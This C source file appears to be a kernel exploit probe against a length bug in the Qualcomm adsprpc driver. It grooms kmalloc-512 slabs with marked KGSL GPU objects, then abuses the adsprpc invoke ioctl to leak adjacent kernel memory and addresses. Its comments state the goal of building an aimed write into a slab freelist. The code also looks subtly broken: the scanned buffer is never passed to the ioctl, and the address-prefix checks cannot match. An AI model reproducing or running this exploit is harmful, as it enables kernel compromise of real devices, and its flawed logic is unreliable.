#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

/* Adjacency probe for the adsprpc length bug.
 *
 * get_args() copies pra[i].buf.len bytes into (ctx->buf->virt + metalen - offset).
 * With the "contained" overlap geometry the pair contributes (mend-mstart)=0 to
 * copylen, so the allocated buffer is only the metadata, while the copy length is
 * whatever the caller asked for: the length is not clamped against the allocation.
 *
 * This program WRITES NOTHING OUT OF BOUNDS.  It only uses the read side
 * (put_args copies from the same kernel-side pointer back into my page) to answer
 * one question: does the page right after my adsprpc DMA buffer contain a
 * kmalloc-512 slab whose objects I planted through KGSL_GPUOBJ_ALLOC metadata?
 * If yes, the marker distance gives me the absolute VA of my own buffer, and the
 * unclamped write length becomes an aimed 8-byte writer into a slab freelist.
 */

typedef struct { void *pv; ssize_t len; } remote_buf_t;
typedef union { remote_buf_t buf; uint32_t h; } remote_arg_t;
#define MAKE_SC(method, in, out) \
    (((uint32_t)(method) << 24) | (((uint32_t)(in) & 0xff) << 16) | (((uint32_t)(out) & 0xff) << 8))
#define IOCW(n, sz) (unsigned long)((3u << 30) | ((sz) << 16) | ((unsigned long)'R' << 8) | (n))
struct ioctl_invoke { uint32_t handle; uint32_t sc; remote_arg_t *pra; };
struct ioctl_init { uint32_t flags, pad; uintptr_t file; int32_t filelen, filefd;
                    uintptr_t mem; int32_t memlen, memfd; };

/* kgsl gpuobj alloc, uapi/linux/msm_kgsl.h */
struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC 0xC0300945UL
#define IOCTL_KGSL_GPUOBJ_FREE  0x40200946UL
struct kgsl_gpuobj_free {
    uint64_t priv;
    unsigned int flags;
    unsigned int len;
    unsigned int id;
    unsigned int pad;
};

#define NMARK 24
static uint32_t g_ids[NMARK];
static int g_nids;

static int plant_markers(int kg)
{
    char meta[64];
    int i;
    g_nids = 0;
    for (i = 0; i < NMARK; i++) {
        struct kgsl_gpuobj_alloc a;
        memset(meta, 0, sizeof meta);
        snprintf(meta, sizeof meta, "QMARK%02d_%08x", i, 0xA5A500 + i);
        memset(&a, 0, sizeof a);
        a.size = 0x1000;
        a.flags = 0;                 /* no GPUREADONLY, no USERMEM */
        a.metadata = (uint64_t)(uintptr_t)meta;
        a.metadata_len = 20;
        errno = 0;
        if (ioctl(kg, IOCTL_KGSL_GPUOBJ_ALLOC, &a) == 0) {
            if (i == 0 || i == NMARK - 1)
                printf("  GPUOBJ_ALLOC #%d ok id=%u size=%llu\n", i, a.id,
                       (unsigned long long)a.size);
            g_ids[g_nids++] = a.id;
        } else {
            printf("  GPUOBJ_ALLOC rc=-1 errno=%d %s (first failure at #%d)\n",
                   errno, strerror(errno), i);
            return -1;
        }
    }
    printf("  planted %d objects with 20-byte metadata markers\n", g_nids);
    return 0;
}

static void release_markers(int kg)
{
    int i;
    for (i = 0; i < g_nids; i++) {
        struct kgsl_gpuobj_free f;
        memset(&f, 0, sizeof f);
        f.id = g_ids[i];
        (void)ioctl(kg, IOCTL_KGSL_GPUOBJ_FREE, &f);
    }
}

int main(int argc, char **argv)
{
    unsigned char *page, *outbuf;
    struct ioctl_init in;
    struct ioctl_invoke iv;
    remote_arg_t pra[3];
    size_t a_len, rd;
    int fd, kg, i;
    int method = argc > 1 ? atoi(argv[1]) : 0;
    int rdlen = argc > 2 ? (int)strtol(argv[2], 0, 0) : 0x1800;
    size_t off = argc > 3 ? (size_t)strtol(argv[3], 0, 0) : 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    a_len = 0x800;
    page = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    outbuf = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(page, 'A', 0x8000);
    memset(outbuf, 0, 0x8000);
    if ((void *)page == MAP_FAILED || (void *)outbuf == MAP_FAILED) { perror("mmap"); return 2; }

    kg = open("/dev/kgsl-3d0", O_RDWR);
    if (kg < 0) { printf("kgsl open failed: %s\n", strerror(errno)); }
    else plant_markers(kg);

    fd = open("/dev/adsprpc-smd", O_RDONLY);
    if (fd < 0) { perror("open adsprpc"); return 2; }
    ioctl(fd, IOCW(5, 4), (unsigned long)0);
    memset(&in, 0, sizeof in);
    i = ioctl(fd, IOCW(6, sizeof in), &in);
    printf("INIT rc=%d errno=%d\n", i, i ? errno : 0);

    memset(pra, 0, sizeof pra);
    pra[0].buf.pv = page;
    pra[0].buf.len = (ssize_t)a_len;
    pra[1].buf.pv = (void *)(page + a_len - off);
    pra[1].buf.len = (ssize_t)rdlen;
    memset(&iv, 0, sizeof iv);
    iv.handle = 1;
    iv.sc = MAKE_SC(method, 1, 1);
    iv.pra = pra;
    errno = 0;
    i = ioctl(fd, IOCW(1, sizeof iv), &iv);
    printf("INVOKE method=%d in.len=%#zx out.len=%#zx offset=%#zx rc=%d errno=%d (%s)\n",
           method, a_len, (size_t)rdlen, off, i, errno, strerror(errno));
    if (i) {
        release_markers(kg);
        return 1;
    }

    /* scan the read-back for my markers and for kernel VA-looking qwords */
    {
        uint64_t v;
        int hits = 0, kva = 0;
        for (rd = 0; rd + 8 <= rdlen; rd += 8) {
            memcpy(&v, outbuf + rd, 8);
            if (v == 0)
                continue;
            if ((v >> 40) == 0xffffffc0ULL || (v >> 40) == 0xffffff80ULL ||
                (v >> 40) == 0xffffaf0ULL) {
                if (kva < 12)
                    printf("  +%04zx kva=%016llx\n", rd, (unsigned long long)v);
                kva++;
            }
            if (memcmp(outbuf + rd, "QMARK", 5) == 0) {
                char tag[24];
                memcpy(tag, outbuf + rd, 20);
                tag[20] = 0;
                printf("  *** +0x%zx marker: \"%s\" ***\n", rd, tag);
                hits++;
            }
        }
        printf("  scan of %#zx bytes: %d kernel-VA-looking qwords, %d marker hits\n",
               rdlen, kva, hits);
        if (!hits && kva)
            printf("  (no marker in this window: my DMA buffer is not adjacent to the "
                   "planted kmalloc-512 page -- retry with a different size/order)\n");
    }
    release_markers(kg);
    if (kg >= 0)
        close(kg);
    close(fd);
    return 0;
}
